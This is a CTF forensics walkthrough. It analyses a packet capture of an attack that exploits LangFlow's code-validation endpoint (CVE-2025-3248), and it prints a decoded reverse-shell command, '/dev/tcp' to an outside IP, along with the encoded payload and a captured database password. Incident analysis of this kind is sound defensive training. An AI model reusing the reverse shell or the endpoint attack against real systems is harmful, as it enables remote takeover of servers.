# Tower of Mists Walkthrough

This document details the step-by-step process of solving the Tower of Mists CTF challenge.

## Initial Triage

The challenge is in the Forensics category and provides a single `capture.pcap` file. The goal is to answer seven questions about a security incident.

My initial approach will be to use command-line tools like `strings` and `tshark` to inspect the pcap file and answer the questions in order.

## Analysis

First, I extracted all printable strings from the pcap file to get a quick overview of the text data within it.

```bash
strings capture.pcap > strings.txt
```

This revealed a lot of useful information, including HTTP requests, API endpoints, and even the output of some commands.

### Question 1: What is the LangFlow version in use?

By examining the `strings.txt` file, I found a request to `/api/v1/version` and its response:

```json
{"version":"1.2.0","main_version":"1.2.0","package":"Langflow"}
```

**Answer:** `1.2.0`

### Question 2: What is the CVE assigned to this LangFlow vulnerability?

Knowing the version number, I searched online for vulnerabilities related to LangFlow 1.2.0.

```bash
google_web_search("LangFlow 1.2.0 vulnerability")
```

The search results pointed to a critical Remote Code Execution (RCE) vulnerability, **CVE-2025-3248**.

**Answer:** `CVE-2025-3248`

### Question 3: What is the name of the API endpoint exploited by the attacker to execute commands on the system?

The `strings.txt` file showed several POST requests to `/api/v1/validate/code`. These requests contained suspicious base64 encoded and zlib compressed Python code.

**Answer:** `/api/v1/validate/code`

### Question 4: What is the IP address of the attacker?

I used `tshark` to filter for the malicious POST requests and identify the source IP address.

```bash
tshark -r capture.pcap -Y 'http.request.method == "POST" && http.request.uri == "/api/v1/validate/code"' -T fields -e ip.src -e ip.dst
```

The output consistently showed `188.114.96.12` as the source IP.

**Answer:** `188.114.96.12`

### Question 5: The attacker used a persistence technique, what is the port used by the reverse shell?

I decoded the payload from one of the malicious POST requests. The payload was a base64 encoded, zlib compressed python script.

```python
import base64
import zlib

encoded_string = "eJwNyE0LgjAYAOC/MnZSKguNqIOCpAdDK8IIT0Pnyza1JvsIi+i313N8VC00oHSiMBohHw4h4j5KZQhxsLbNqCQFrbHrUQ60J9Ka0RoHA+USUZ+x/Nazs6hY7l+GVuxWVRA/i7KY8i62x3dmi/02OCXXV5bEs0OXhp+m1rBZo8WiBSpbQFGEvkvvv1xRPEeawzCEpbLguj8DMjVN"
decoded_string = zlib.decompress(base64.b64decode(encoded_string))
print(decoded_string.decode())
```

This revealed another layer of base64 encoding. Decoding that revealed the reverse shell command:

```bash
echo 'c2ggLWkgPiYgL2Rldi90Y3AvMTMxLjAuNzIuMC83ODUyIDA+JjE=' | base64 --decode
```

Which gives: `sh -i >& /dev/tcp/131.0.72.0/7852 0>&1`. The port is `7852`.

**Answer:** `7852`

### Question 6: What is the system machine hostname?

The output of one of the executed commands in `strings.txt` contained the hostname:

```
HOSTNAME=aisrv01
```

**Answer:** `aisrv01`

### Question 7: What is the Postgres password used by LangFlow?

The same command output also revealed the Postgres database URL, including the password:

```
LANGFLOW_DATABASE_URL=postgresql://langflow:LnGFlWPassword2025@postgres:5432/langflow
```

**Answer:** `LnGFlWPassword2025`

## Solution

The flags are the answers to the seven questions, which have been saved to `flag.txt`.